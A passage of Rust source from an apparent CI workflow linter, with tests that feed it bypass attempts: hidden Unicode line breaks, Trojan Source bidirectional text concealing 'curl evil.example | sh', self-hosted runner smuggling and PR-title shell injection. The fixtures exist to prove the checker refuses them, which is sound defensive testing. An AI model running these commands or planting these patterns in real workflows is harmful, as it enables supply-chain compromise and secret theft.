                out.push((name.to_owned(), reads.clone()));
            } else {
                shadowed.get_or_insert(name.to_owned());
            }
        }
    }
    out
}

/// Arguments of each call of the installer on a workflow line. A mention is a call when the
/// script path (plain characters, possibly quoted) is the first word, or follows `bash`, `sh`,
/// an option, `run:` or a separate shell separator. Arguments stop at a comment or separator.
/// Any other mention is not a call, and [`tool_lock_errors`] refuses it.
fn installer_calls(line: &str) -> Vec<Vec<&str>> {
    const SEPARATORS: [&str; 6] = ["&&", "||", ";", "|", "then", "do"];
    let tokens: Vec<&str> = line.split_whitespace().collect();
    let mut calls = Vec::new();
    for (i, token) in tokens.iter().enumerate() {
        let path = token.trim_matches(['"', '\'']);
        let named = path == SCRIPT_NAME || path.ends_with("/install-tools.sh");
        let plain = path
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || b"_./-".contains(&b));
        if !(named && plain) {
            continue;
        }
        let call = match i.checked_sub(1).map(|p| tokens[p]) {
            None => true,
            Some(prev) => {
                ["bash", "sh", "run:"].contains(&prev)
                    || SEPARATORS.contains(&prev)
                    || (prev.starts_with('-') && prev != "-") // an option, not a list item
            }
        };
        if call {
            let mut args = Vec::new();
            for t in &tokens[i + 1..] {
                if t.starts_with('#') || SEPARATORS.contains(t) {
                    break;
                }
                let arg = t.trim_end_matches(';').trim_matches(['"', '\'']);
                if !arg.is_empty() {
                    args.push(arg);
                }
                if t.ends_with(';') {
                    break;
                }
            }
            calls.push(args);
        }
    }
    calls
}

/// Line `i` is a path filter of a trigger, which names the installer without running it:
/// `paths: [ … ]` or `paths-ignore: [ … ]`, or a `- path` item of such a list. Every entry must
/// be a plain path or glob, so that no shell text can pass for a filter.
fn path_filter_entry(lines: &[&str], i: usize) -> bool {
    const FILTERS: [&str; 2] = ["paths", "paths-ignore"];
    let glob = |s: &str| {
        let s = s.trim_matches(' ').trim_matches(['"', '\'']);
        !s.is_empty()
            && s.bytes()
                .all(|b| b.is_ascii_alphanumeric() || b"_./*!-".contains(&b))
    };
    let Some(l) = parse(lines[i]) else {
        return false;
    };
    let value = strip_comment(l.value);
    if let Some(key) = l.key.as_deref() {
        let list = value.strip_prefix('[').and_then(|v| v.strip_suffix(']'));
        return FILTERS.contains(&key) && !l.item && list.is_some_and(|v| v.split(',').all(glob));
    }
    if !glob(value) {
        return false;
    }
    for prev in lines[..i].iter().rev() {
        let t = prev.trim_matches(' ');
        if t.is_empty() || t.starts_with('#') {
            continue;
        }
        return match parse(prev) {
            Some(p) if p.item && p.key.is_none() && p.dash == l.dash => continue,
            Some(p) => {
                !p.item
                    && p.col < l.dash
                    && strip_comment(p.value).is_empty()
                    && p.key.as_deref().is_some_and(|k| FILTERS.contains(&k))
            }
            None => false,
        };
    }
    false
}

/// A tool name that `version <tool>` turns into the key `<tool>.version` (the `version)` entry
/// escapes `.` only, so nothing else may reach its regex).
fn version_tool(tool: &str) -> bool {
    tool.split('.').all(ident)
}

/// Every call of the installer in a workflow must name a known subcommand whose `tools.lock`
/// keys are all present and non-empty (#75: `cargo-fuzz` was called by nightly.yml with no
/// pinned version, so the weekly fuzzing failed on its first run). Every other non-comment line
/// that names the installer is refused, path filters excepted: a call the check cannot
/// recognise must not pass unchecked. `workflows`: (path, text).
pub fn tool_lock_errors(workflows: &[(String, String)], script: &str, lock: &str) -> Vec<String> {
    let known = installer_keys(script);
    let lookup = |sub: &str| known.iter().find(|(name, _)| name == sub).map(|(_, r)| r);
    let mut errors = Vec::new();
    for (path, text) in workflows {
        let lines: Vec<&str> = text.lines().collect();
        for (i, line) in lines.iter().enumerate() {
            if !line.contains(SCRIPT_NAME)
                || line.trim_start_matches(' ').starts_with('#') // YAML or shell comment: nothing runs
                || path_filter_entry(&lines, i)
            {
                continue;
            }
            let at = format!("{path} : line {}", i + 1);
            let calls = installer_calls(line);
            if calls.len() != line.matches(SCRIPT_NAME).count() {
                errors.push(format!(
                    "{at} : unrecognised mention of {SCRIPT_NAME}: write each call as \
                     `bash {INSTALL_SCRIPT} <subcommand>`; a paths: filter is the only other form"
                ));
                continue;
            }
            for args in calls {
                let keys = match args.as_slice() {
                    [] => Err("install-tools.sh without a subcommand".to_owned()),
                    [sub, rest @ ..] => match (lookup(sub), rest) {
                        (None, _) => Err(format!("unknown install-tools.sh subcommand `{sub}`")),
                        (Some(Err(e)), _) => Err(format!("install-tools.sh {sub}: {e}")),
                        (Some(Ok(Reads::Keys(keys))), _) => Ok(keys.clone()),
                        (Some(Ok(Reads::ToolVersion)), [tool, ..]) if version_tool(tool) => {
                            Ok(vec![format!("{tool}.version")])
                        }
                        (Some(Ok(Reads::ToolVersion)), _) => {
                            Err("install-tools.sh version without a literal tool name".to_owned())
                        }
                    },
                };
                match keys {
                    Ok(keys) => errors.extend(
                        keys.iter()
                            .filter(|key| sh_lock_value(lock, key).is_none())
                            .map(|key| {
                                format!("{at} : {key} missing or empty in {TOOLS_LOCK} (SEC0-06)")
                            }),
                    ),
                    Err(e) => errors.push(format!("{at} : {e}")),
                }
            }
        }
    }
    errors
}

#[cfg(test)]
mod tests {
    use super::*;

    const SHA: &str = "11bd71901bbe5b1630ceea73d27597364c9af683";

    fn good() -> String {
        format!(
            "on:\n  pull_request:\npermissions: {{}}\njobs:\n  a:\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n    \
             steps:\n      - uses: actions/checkout@{SHA} # v4\n        with:\n          persist-credentials: false\n      \
             - name: t\n        env:\n          TITLE: ${{{{ github.event.pull_request.title }}}}\n        run: |\n          \
             echo \"$TITLE\"\n          cargo xtask check --only workflows\n"
        )
    }

    #[test]
    fn accepts_a_conforming_workflow() {
        assert_eq!(check_workflow(&good()), Vec::<String>::new());
    }

    #[test]
    fn refuses_each_violation() {
        let cases = [
            ("permissions: {}", "permissions: write-all"),
            ("pull_request:", "pull_request_target:"),
            ("persist-credentials: false", "persist-credentials: true"),
            (&format!("@{SHA}") as &str, "@v4"),
            ("actions/checkout@", "evil/checkout@"),
            ("echo \"$TITLE\"", "echo \"${{ github.head_ref }}\""),
            ("cargo xtask", "echo ${{inputs.x}} && cargo xtask"),
            (
                "      - name: t",
                "      - uses: docker://alpine\n      - name: t",
            ),
            (
                "      - name: t",
                "      - {uses: actions/cache@x}\n      - name: t",
            ),
            ("TITLE: ${{", "TITLE: *alias\n          X: ${{"),
            (
                "echo \"$TITLE\"",
                "echo \"${{ GITHUB.EVENT.issue.title }}\"",
            ),
            ("echo \"$TITLE\"", "echo '${{ toJSON(github) }}'"),
            ("echo \"$TITLE\"", "echo ${{ env.TITLE }}"),
            (
                "      - name: t",
                "      - \"uses\": evil/a@main\n      - name: t",
            ),
            (
                "        run: |",
                "        'run': echo ${{ github.head_ref }} |",
            ),
            // Contournements relevés par la relecture de sécurité.
            ("echo \"$TITLE\"", "echo ${{ matrix.t }}"),
            ("    steps:", "    steps: [{uses: evil/x@main}]\n    other:"),
            (
                "    steps:",
                "    steps: [{run: \"echo ${{ github.head_ref }}\"}]\n    other:",
            ),
            (
                "      - name: t",
                "      - \"u\\x73es\": evil/x@main\n      - name: t",
            ),
            ("  pull_request:", "  \"pull_request_t\\x61rget\":"),
            ("        with:\n", "        env:\n"),
            // Relecture neuve, I1 : clés explicites, balises, flux, indentation, interpolations.
            (
                "        run: |",
                "        ? run\n        : echo \"${{ github.head_ref }}\"\n        x: |",
            ),
            (
                "      - name: t",
                "      - name: k\n        ? uses\n        : evil/x@main\n      - name: t",
            ),
            ("      - name: t", "      - ? uses\n      - name: t"),
            ("TITLE: ${{", "TITLE: !!str x\n          X: ${{"),
            ("TITLE: ${{", "TITLE: &a x\n          X: ${{"),
            ("        env:", "         env:"),
            (
                "      contents: read",
                "      contents: read\n     actions: read",
            ),
            ("  a:\n", "  name: ${{ github.event.issue.title }}\n  a:\n"),
            ("  a:\n", "  a:\n    runs-on: ${{ matrix.os }}\n"),
            ("permissions: {}", "permissions: {}\n---"),
            // m4 : clés comparées sans tenir compte de la casse.
            (
                "      - name: t",
                "      - USES: evil/x@main\n      - name: t",
            ),
            (
                "        run: |",
                "        Run: echo ${{ github.head_ref }} |",
            ),
            ("persist-credentials: false", "Persist-Credentials: true"),
        ];
        for (from, to) in cases {
            let text = good().replacen(from, to, 1);
            assert_ne!(text, good(), "{from}");
            assert!(!check_workflow(&text).is_empty(), "accepté à tort : {to}");
        }
        let inline = good().replace("run: |", "run: echo ${{ github.event.issue.title }}");
        assert!(!check_workflow(&inline).is_empty());
        assert!(!check_workflow(&good().replace("permissions: {}\n", "")).is_empty());
    }

    #[test]
    fn reads_pins() {
        let text = good().replace(
            "      - name: t",
            &format!("      - uses: actions/cache/restore@{SHA}\n      - uses: \"Swatinem/rust-cache@{SHA}\" # ../x\n      - name: t"),
        );
        let pins = pinned_uses(&text);
        assert_eq!(pins.len(), 3);
        assert_eq!(
            pins[0],
            Pin {
                line: 10,
                repo: "actions/checkout".into(),
                sha: SHA.into(),
                tag: Some("v4".into())
            }
        );
        assert_eq!(
            (pins[1].repo.as_str(), pins[1].tag.as_deref()),
            ("actions/cache", None)
        );
        assert_eq!(
            (pins[2].repo.as_str(), pins[2].tag.as_deref()),
            ("Swatinem/rust-cache", None)
        );
    }

    #[test]
    fn accepts_safe_forms() {
        let runner = good().replace(
            "echo \"$TITLE\"",
            "echo ${{ runner.os }} ${{runner.temp}} \\",
        );
        assert_eq!(check_workflow(&runner), Vec::<String>::new());
        let list = good().replace(
            "  pull_request:",
            "  push:\n    branches: [main, \"release\"]\n    tags:\n      - v1\n      - 'v2'",
        );
        assert_eq!(check_workflow(&list), Vec::<String>::new());
        let data = good().replace(
            "    steps:",
            "    if: ${{ github.event_name == 'push' }}\n    env:\n      M: ${{ matrix.os }}\n    steps:",
        );
        assert_eq!(check_workflow(&data), Vec::<String>::new());
        let with = good().replace(
            "          persist-credentials: false",
            "          persist-credentials: false\n          ref: ${{ github.head_ref }}",
        );
        assert_eq!(check_workflow(&with), Vec::<String>::new());
        let flush = good().replace("      - uses", "    - uses").replace(
            "        with:\n          persist",
            "      with:\n        persist",
        );
        let flush = flush.replace(
            "      - name: t\n        env:\n          TITLE",
            "    - name: t\n      env:\n        TITLE",
        );
        let flush = flush.replace(
            "        run: |\n          echo \"$TITLE\"\n          cargo",
            "      run: |\n        echo \"$TITLE\"\n        cargo",
        );
        assert_eq!(check_workflow(&flush), Vec::<String>::new());
    }

    /// `good()` with its trigger block replaced by `on`.
    fn with_on(on: &str) -> String {
        good().replacen("on:\n  pull_request:\n", on, 1)
    }

    /// `good()` with the job's `runs-on: ubuntu-24.04` line replaced by `runs_on`.
    fn with_runs_on(runs_on: &str) -> String {
        assert!(
            good().contains(
                "    runs-on: ubuntu-24.04
"
            ),
            "fixture drifted"
        );
        good().replacen("    runs-on: ubuntu-24.04\n", runs_on, 1)
    }

    /// #77: the repository is public, so a workflow must not run with the base repository's
    /// secrets on text from a fork (`pull_request_target`) or on the result of another
    /// workflow (`workflow_run`), whatever the YAML form of the trigger.
    #[test]
    fn refuses_pull_request_target_and_workflow_run() {
        for event in ["pull_request_target", "workflow_run"] {
            let upper = event.to_ascii_uppercase();
            for on in [
                format!("on: {event}\n"),
                format!("on: \"{event}\"\n"),
                format!("on: [push, {event}]\n"),
                format!("on: [{event}]\n"),
                format!("on: {{{event}: {{}}}}\n"),
                format!("on:\n  - push\n  - {event}\n"),
                format!("on:\n  - '{event}'\n"),
                format!("on:\n  {event}:\n"),
                format!("on:\n  {event}:\n    types: [opened]\n"),
                format!("on:\n  pull_request:\n  {event}:\n"),
                format!("on:\n  push:\n  \"{event}\":\n"),
                format!("on:\n  '{event}':\n"),
                format!("\"on\":\n  {event}:\n"),
                format!("on:\n  {upper}:\n"),
                format!("on:\n  {event}: # comment\n"),
                format!("on: [push, \"{upper}\"]\n"),
            ] {
                let text = with_on(&on);
                assert_ne!(text, good(), "{on}");
                let errors = check_workflow(&text);
                assert!(
                    errors
                        .iter()
                        .any(|e| e.contains(&format!("{event} interdit"))),
                    "{on}: {errors:?}"
                );
            }
        }
        // The triggers the workflows use stay accepted.
        for on in [
            "on:\n  pull_request:\n  push:\n    branches: [main]\n",
            "on:\n  schedule:\n    - cron: '17 3 * * *'\n  workflow_dispatch:\n",
            "on: [push, workflow_dispatch]\n",
        ] {
            assert_eq!(check_workflow(&with_on(on)), Vec::<String>::new(), "{on}");
        }
    }

    /// #77, AS-53: `on:` takes only `push`, `pull_request`, `schedule` and `workflow_dispatch`,
    /// in every YAML form; any other event, or a name the check cannot read, is refused.
    #[test]
    fn refuses_events_outside_the_closed_list() {
        for event in [
            "issue_comment",
            "issues",
            "pull_request_review",
            "pull_request_review_comment",
            "discussion",
            "discussion_comment",
            "release",
            "workflow_call",
            "repository_dispatch",
            "merge_group",
            "pull_request_target",
            "workflow_run",
            "fork",
            "Issue_Comment",
        ] {
            for on in [
                format!("on: {event}\n"),
                format!("on: \"{event}\"\n"),
                format!("on: '{event}' # comment\n"),
                format!("on: [push, {event}]\n"),
                format!("on: [{event}]\n"),
                format!("on:\n  - push\n  - {event}\n"),
                format!("on:\n  - \"{event}\"\n"),
                format!("on:\n  push:\n  {event}:\n"),
                format!("on:\n  {event}:\n    types: [created]\n"),
                format!("on:\n  \"{event}\":\n"),
                format!("on:\n  '{event}':\n"),
                format!("\"on\":\n  {event}:\n"),
                format!("on:\n  {}:\n", event.to_ascii_uppercase()),
            ] {
                let text = with_on(&on);
                assert_ne!(text, good(), "{on}");
                let errors = check_workflow(&text);
                assert!(
                    errors.iter().any(|e| e.contains("allowed triggers") || e.contains("forme non reconnue")),
                    "{on}: {errors:?}"
                );
            }
        }
        // Names the check cannot read, and workflows without a readable trigger.
        for on in [
            "on: ${{ github.event_name }}\n",
            "on: [push, ${{ inputs.e }}]\n",
            "on:\n  - ${{ inputs.e }}\n",
            "on:\n  ${{ inputs.e }}:\n",
            "on: &e push\n",
            "on: *e\n",
            "on: !!str push\n",
            "on: |\n  push\n",
            "on: >\n  push\n",
            "on: push, issues\n",
            "on: push issues\n",
            "on: {push: {}}\n",
            "on: [push, {issues: {}}]\n",
            "on: []\n",
            "on: [push, ]\n",
            "on:\n",
            "on:\n  - push: {}\n",
            "on: ''\n",
        ] {
            let errors = check_workflow(&with_on(on));
            assert!(
                errors.iter().any(|e| e.contains("#77")),
                "accepted: {on}: {errors:?}"
            );
        }
        let none = good().replacen("on:\n  pull_request:\n", "", 1);
        assert!(
            check_workflow(&none)
                .iter()
                .any(|e| e.contains("exactly one"))
        );
        let twice = good().replacen("jobs:", "on: push\njobs:", 1);
        assert!(
            check_workflow(&twice)
                .iter()
                .any(|e| e.contains("exactly one"))
        );
        // The four events stay accepted in every form.
        for on in [
            "on: push\n",
            "on: \"pull_request\"\n",
            "on: [push, pull_request, schedule, workflow_dispatch]\n",
            "on: ['push', \"workflow_dispatch\"] # both\n",
            "on:\n  - schedule\n  - workflow_dispatch\n",
            "on:\n  push:\n    branches: [main]\n    paths:\n      - 'a/**'\n  pull_request:\n    types: [opened]\n",
            "on:\n  schedule:\n    - cron: '17 3 * * 0'\n  workflow_dispatch:\n",
        ] {
            assert_eq!(check_workflow(&with_on(on)), Vec::<String>::new(), "{on}");
        }
    }

    #[test]
    fn accepts_the_hosted_runners() {
        for runs_on in [
            "runs-on: ubuntu-24.04",
            "runs-on: windows-2025",
            "runs-on: \"ubuntu-24.04\"",
            "runs-on: 'windows-2025' # hosted",
            "runs-on:   ubuntu-24.04  ",
        ] {
            let text = with_runs_on(&format!("    {runs_on}\n"));
            assert_eq!(check_workflow(&text), Vec::<String>::new(), "{runs_on}");
        }
        // Two jobs, each with its own runner.
        let two = format!("{}  b:\n    runs-on: windows-2025\n    steps: []\n", good());
        assert_eq!(check_workflow(&two), Vec::<String>::new());
    }

    /// #77: only the explicit GitHub-hosted images pass; a self-hosted runner on a public
    /// repository would run a fork's code on the maintainer's machine.
    #[test]
    fn refuses_self_hosted_and_unlisted_runners() {
        for runs_on in [
            "runs-on: self-hosted",
            "runs-on: Self-Hosted",
            "runs-on: \"self-hosted\"",
            "runs-on: [self-hosted]",
            "runs-on: [self-hosted, linux, x64]",
            "runs-on: [ubuntu-24.04, self-hosted]",
            "runs-on: [ubuntu-24.04]",
            "runs-on: ubuntu-24.04, self-hosted",
            "runs-on: ubuntu-24.04 self-hosted",
            "runs-on: ubuntu-latest",
            "runs-on: ubuntu-22.04",
            "runs-on: ubuntu-24.04-arm",
            "runs-on: windows-latest",
            "runs-on: macos-15",
            "runs-on: my-runner",
            "runs-on: Ubuntu-24.04",
            "runs-on: ubuntu-24.04x",
            "runs-on: 'ubuntu-24.04",
            "runs-on: \"ubuntu-24.04'",
            "runs-on: ''",
            "runs-on:",
            "runs-on: ${{ matrix.os }}",
            "runs-on: ${{ 'ubuntu-24.04' }}",
            "runs-on: ${{ runner.os }}",
            "runs-on: ubuntu-${{ matrix.v }}",
            "runs-on: {group: big, labels: ubuntu-24.04}",
            "runs-on: *hosted",
            "runs-on: !!str ubuntu-24.04",
            "Runs-On: self-hosted",
            "\"runs-on\": self-hosted",
            "runs-on:\n      - self-hosted",
            "runs-on:\n      - ubuntu-24.04",
            "runs-on:\n      group: ci\n      labels: ubuntu-24.04",
            "runs-on: |\n      self-hosted",
        ] {
            let text = with_runs_on(&format!("    {runs_on}\n"));
            let errors = check_workflow(&text);
            assert!(
                errors.iter().any(|e| e.contains("GitHub-hosted images")
                    || e.contains("closed grammar")
                    || e.contains("forme non reconnue")),
                "{runs_on}: {errors:?}"
            );
        }
        // The refusal names the value.
        let errors = check_workflow(&with_runs_on("    runs-on: self-hosted\n"));
        assert!(errors.iter().any(|e| e.contains("runs-on \"self-hosted\"")));
        // A second job on a self-hosted runner, a runner outside any job, a doubled key.
        let other = format!("{}  b:\n    runs-on: self-hosted\n    steps: []\n", good());
        assert!(!check_workflow(&other).is_empty());
        let top = good().replacen("jobs:", "runs-on: self-hosted\njobs:", 1);
        assert!(!check_workflow(&top).is_empty());
        let twice = with_runs_on("    runs-on: ubuntu-24.04\n    runs-on: windows-2025\n");
        let errors = check_workflow(&twice);
        assert!(
            errors.iter().any(|e| e.contains("defined twice")),
            "{errors:?}"
        );
    }

    /// #77: a job whose `runs-on:` the check does not find itself is refused, not assumed hosted
    /// (a `runs-on:` elsewhere in the job, or in another job, does not count).
    #[test]
    fn refuses_a_job_without_its_own_runner() {
        let errors = check_workflow(&with_runs_on(""));
        assert!(
            errors.iter().any(|e| e.contains("job `a` without")),
            "{errors:?}"
        );
        let nested = with_runs_on("    env:\n      runs-on: ubuntu-24.04\n");
        assert!(
            check_workflow(&nested)
                .iter()
                .any(|e| e.contains("job `a`"))
        );
        let reusable = with_runs_on("    uses: ./.github/workflows/x.yml\n");
        assert!(!check_workflow(&reusable).is_empty());
        let second = format!("{}  b:\n    steps: []\n", good());
        let errors = check_workflow(&second);
        assert!(
            errors.len() == 1 && errors[0].contains("job `b` without"),
            "{errors:?}"
        );
    }

    /// Review of #101: text after a CR, NEL, LS or PS is a comment for `lines()` but new YAML
    /// lines for a parser. A second job on a self-hosted runner with a step `run: echo pwned`
    /// went through unseen behind `# c<CR>`.
    #[test]
    fn refuses_line_breaks_that_hide_yaml() {
        for br in ['\r', '\u{85}', '\u{2028}', '\u{2029}'] {
            let hidden = format!(
                "# c{br}  b:{br}    runs-on: self-hosted{br}    steps:{br}      - ? run # z{br}        : echo pwned"
            );
            let appended = good().replacen(
                "persist-credentials: false",
                &format!("persist-credentials: false {hidden}"),
                1,
            );
            let duplicate = good().replacen(
                "runs-on: ubuntu-24.04",
                &format!("runs-on: ubuntu-24.04 # c{br}    runs-on: self-hosted"),
                1,
            );
            let trigger = good().replacen(
                "pull_request:",
                &format!("pull_request: # c{br}  issue_comment:"),
                1,
            );
            let end = format!("{}# end{br}", good());
            let start = format!("{br}{}", good());
            for text in [appended, duplicate, trigger, end, start] {
                let errors = check_workflow(&text);
                assert!(
                    errors.iter().any(|e| e.contains("character U+")),
                    "{br:?}: {errors:?}"
                );
            }
        }
        // A trailing lone CR is no line of `lines()`: the whole text is checked as well.
        let tail = format!("{}\r", good());
        assert!(!check_workflow(&tail).is_empty());
        // A tab, VT or FF is refused too, by the same rule (the tab had a rule of its own).
        for c in ['\t', '\u{b}', '\u{c}'] {
            let text = good().replacen("jobs:", &format!("jobs:{c}"), 1);
            let errors = check_workflow(&text);
            assert!(errors.iter().any(|e| e.contains("character U+")), "{c:?}");
        }
        // A CRLF file stays accepted, a CR before the CRLF does not.
        let crlf = good().replace('\n', "\r\n");
        assert_eq!(check_workflow(&crlf), Vec::<String>::new());
        let double = good().replacen("jobs:\n", "jobs:\r\r\n", 1);
        assert!(!check_workflow(&double).is_empty());
    }

    /// Review of #101 (third): `trim()` removes every Unicode white space, YAML only the space
    /// and the tab. A line made of a no-break space and `# ...` was an empty comment for this
    /// check and the continuation of the previous `run:` for YAML, which expanded the PR title
    /// in the shell (SEC0-31). Every white space, control and invisible character is refused in
    /// the whole file, by one rule.
    #[test]
    fn refuses_unicode_white_space_that_hides_yaml() {
        let title = "# ${{ github.event.pull_request.title }}";
        let spaces = [
            '\u{a0}', '\u{1680}', '\u{2000}', '\u{2001}', '\u{2005}', '\u{200a}', '\u{202f}',
            '\u{205f}', '\u{3000}', '\u{85}', '\u{2028}', '\u{2029}',
        ];
        let invisible = [
            '\u{200b}',
            '\u{200c}',
            '\u{200d}',
            '\u{2060}',
            '\u{feff}',
            '\0',
            '\u{ad}',
            '\u{61c}',
            '\u{180e}',
            '\u{200e}',
            '\u{200f}',
            '\u{202a}',
            '\u{202b}',
            '\u{202c}',
            '\u{202d}',
            '\u{202e}',
            '\u{2061}',
            '\u{2062}',
            '\u{2063}',
            '\u{2064}',
            '\u{2066}',
            '\u{2067}',
            '\u{2068}',
            '\u{2069}',
            '\u{206a}',
            '\u{206f}',
            '\u{fff9}',
            '\u{fffa}',
            '\u{fffb}',
            '\u{e0000}',
            '\u{e0001}',
            '\u{e0020}',
            '\u{e007f}',
        ];
        for c in spaces.into_iter().chain(invisible) {
            let run = good().replacen(
                "          cargo xtask check --only workflows\n",
                &format!("          cargo xtask check --only workflows\n          {c}{title}\n"),
                1,
            );
            let inline = good().replacen(
                "run: |",
                &format!("run: echo hello\n          {c}{title}\n        x: |"),
                1,
            );
            let trigger = good().replacen(
                "  pull_request:\n",
                &format!("  pull_request:\n  {c}# issue_comment\n"),
                1,
            );
            let on = good().replacen(
                "on:\n  pull_request:\n",
                &format!("on: push\n{c}# issue_comment\n"),
                1,
            );
            let blank = good().replacen("jobs:\n", &format!("{c}\njobs:\n"), 1);
            let inside = good().replacen("echo", &format!("echo{c}"), 1);
            let start = format!("{c}{}", good());
            for text in [run, inline, trigger, on, blank, inside, start] {
                assert_ne!(text, good());
                let errors = check_workflow(&text);
                let code = format!("U+{:04X}", u32::from(c));
                assert!(
                    errors.iter().any(|e| e.contains(&code)),
                    "{c:?}: {errors:?}"
                );
            }
        }
        // Printable non-ASCII text stays accepted, in values and in comments.
        let french = good().replacen(
            "echo \"$TITLE\"",
            "echo \"anomalie détectée\" # été à Noël, « ok » \u{2014} \u{20ac}",
            1,
        );
        assert_eq!(check_workflow(&french), Vec::<String>::new());
        let comment = good().replacen("  a:\n", "  # Contrôle détecté\n  a:\n", 1);
        assert_eq!(check_workflow(&comment), Vec::<String>::new());
    }

    /// "Trojan Source": bidirectional controls make a reviewer read a `run:` line differently
    /// from the shell. They do not mislead YAML, but the check refuses them all the same, with
    /// the other invisible format characters, over their whole ranges.
    #[test]
    fn refuses_bidirectional_and_invisible_format_characters() {
        // An RLO/LRI inversion in a `run:` line: the displayed order differs from the executed one.
        let inversion = good().replacen(
            "echo \"$TITLE\"",
            "echo \"user\u{202e} \u{2066}; curl evil.example | sh #\u{2069} \u{2066}\"",
            1,
        );
        let errors = check_workflow(&inversion);
        assert!(errors.iter().any(|e| e.contains("U+202E")), "{errors:?}");
        let isolate = good().replacen("echo \"$TITLE\"", "echo \"\u{2067}x\u{2069}\"", 1);
        assert!(!check_workflow(&isolate).is_empty());
        let ranges = [
            ('\u{ad}', '\u{ad}'),
            ('\u{61c}', '\u{61c}'),
            ('\u{180e}', '\u{180e}'),
            ('\u{200b}', '\u{200f}'),
            ('\u{202a}', '\u{202e}'),
            ('\u{2060}', '\u{2064}'),
            ('\u{2066}', '\u{206f}'),
            ('\u{fff9}', '\u{fffb}'),
            ('\u{e0000}', '\u{e007f}'),
        ];
        for (first, last) in ranges {
            for c in first..=last {
                let text = good().replacen("echo \"$TITLE\"", &format!("echo \"{c}\""), 1);
                assert!(
                    !check_workflow(&text).is_empty(),
                    "accepted U+{:04X}",
                    u32::from(c)
                );
            }
        }
        // The neighbours of the ranges are ordinary printable characters.
        for c in [
            '\u{ac}',
            '\u{ae}',
            '\u{61b}',
            '\u{61d}',
            '\u{2070}',
            '\u{fffc}',
            '\u{e0080}',
        ] {
            let text = good().replacen("echo \"$TITLE\"", &format!("echo \"{c}\""), 1);
            assert_eq!(
                check_workflow(&text),
                Vec::<String>::new(),
                "U+{:04X}",
                u32::from(c)
            );
        }
    }

    /// A workflow made of `jobs:` with one job `a` on a hosted runner and `steps`, behind the
    /// header every probe of the fourth review shares (the checkout keeps its guard).
    fn probe(steps: &str) -> String {
        format!(
            "on:\n  pull_request:\npermissions: {{}}\njobs:\n  a:\n    runs-on: ubuntu-24.04\n    steps:\n{steps}"
        )
    }

    const CHECKOUT: &str = "      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4\n        with:\n          persist-credentials: false\n";
    const TITLE: &str = "${{ github.event.pull_request.title }}";

    /// Fourth review of #101: a quote left open. YAML reads the scalar up to its closing quote,
    /// the check read the next lines as `env:`, `with:` or `if:` keys, or as comments, and let
    /// the PR title reach the shell (SEC0-31). One node per line, closed on its line.
    #[test]
    fn refuses_what_continues_on_the_next_line() {
        let probes = [
            // p4-q-if, p4-q-env, p4-q-with, p4-q-comment
            format!("{CHECKOUT}      - run: \"echo hi\n        if: {TITLE}\"\n"),
            format!("{CHECKOUT}      - run:\n          \"env:\n            A: {TITLE}\"\n"),
            format!("{CHECKOUT}      - run:\n          'with:\n            A: {TITLE}'\n"),
            format!("{CHECKOUT}      - run: \"echo hi\n          # {TITLE}\"\n"),
            // The guard hidden in a quoted `ref:` (p4-q-persist).
            "      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4\n        with:\n          ref:\n            \"a:\n            persist-credentials: false\n            b: c\"\n".to_owned(),
            // p5-flow: flow collections that close on a later line.
            "      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4\n        with: {\n          ref: main,\n          x: y }\n      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4\n        with:\n          ref: [\n          persist-credentials: false ]\n".to_owned(),
            // Plain and single-quoted scalars on several lines, a value after the closing quote.
            format!("{CHECKOUT}      - run: echo hi\n          env:\n            A: {TITLE}\n"),
            format!("{CHECKOUT}      - run: 'echo hi\n          if: {TITLE}'\n"),
            format!("{CHECKOUT}      - run: \"echo\" hi\n"),
            format!("{CHECKOUT}      - run: [a, b\n"),
        ];
        for steps in probes {
            let errors = check_workflow(&probe(&steps));
            assert!(!errors.is_empty(), "accepted:\n{steps}");
        }
        // p4-q-runner: the runner hidden behind an open quote.
        let runner = "on:\n  pull_request:\npermissions: {}\njobs:\n  a:\n    runs-on:\n      \"x:\n      runs-on: ubuntu-24.04\"\n    steps:\n      - run: echo hi\n";
        assert!(!check_workflow(runner).is_empty());
        // The same nodes, written on one line, are inside the grammar.
        let one_line =
            format!("{CHECKOUT}      - run: \"echo hi\"\n        env:\n          A: {TITLE}\n");
        assert_eq!(check_workflow(&probe(&one_line)), Vec::<String>::new());
    }

    /// AS-54: the closed grammar, form by form.
    #[test]
    fn reads_the_closed_grammar() {
        use Value::{Block, Empty, Scalar};
        for (value, read) in [
            ("", Empty),
            ("# only a comment", Empty),
            ("plain text", Scalar("plain text")),
            ("plain text # comment", Scalar("plain text")),
            ("a#b", Scalar("a#b")),
            (
                "${{ github.event_name == 'push' }}",
                Scalar("${{ github.event_name == 'push' }}"),
            ),
            ("\"double\"", Scalar("\"double\"")),
            ("\"double\" # comment", Scalar("\"double\"")),
            ("\"a # not a comment\"", Scalar("\"a # not a comment\"")),
            ("'single'", Scalar("'single'")),
            ("'it''s'", Scalar("'it''s'")),
            ("'it''s' # c", Scalar("'it''s'")),
            ("''", Scalar("''")),
            ("[]", Scalar("[]")),
            ("{}", Scalar("{}")),
            ("[a, b]", Scalar("[a, b]")),
            ("[a, \"b]\"] # c", Scalar("[a, \"b]\"]")),
            ("{a: b, c: [d]}", Scalar("{a: b, c: [d]}")),
            ("|", Block("|")),
            ("|-", Block("|-")),
            (">", Block(">")),
            (">- # folded", Block(">-")),
            ("-5", Scalar("-5")),
            ("-x", Scalar("-x")),
        ] {
            assert_eq!(read_value(value), Ok(read), "{value}");
        }
        for value in [
            "\"open",
            "'open",
            "\"a\" b",
            "'a'b",
            "'it's'",
            "\"a\"#c",
            "[a, b",
            "{a: b",
            "[a, [b]",
            "[a}",
            "[a] b",
            "{a: b}c",
            "|2",
            "|+",
            ">+",
            "|--",
            "|x",
            "> text",
            "&anchor x",
            "*alias",
            "!!str x",
            "%directive",
            "@x",
            "`x",
            "- x",
            "? x",
            ": x",
            "-",
            "a: b",
            "a:",
        ] {
            assert!(read_value(value).is_err(), "accepted: {value}");
        }
        // Lines of each form, in a workflow: a bare key with one dot, a block, a list item.
        let ok = probe(&format!(
            "{CHECKOUT}      - name: 'a'\n        run: |\n          echo hi: there\n          # not a comment of YAML\n      - run: >-\n          echo\n      - name: x # c\n\n      # a comment\n"
        ));
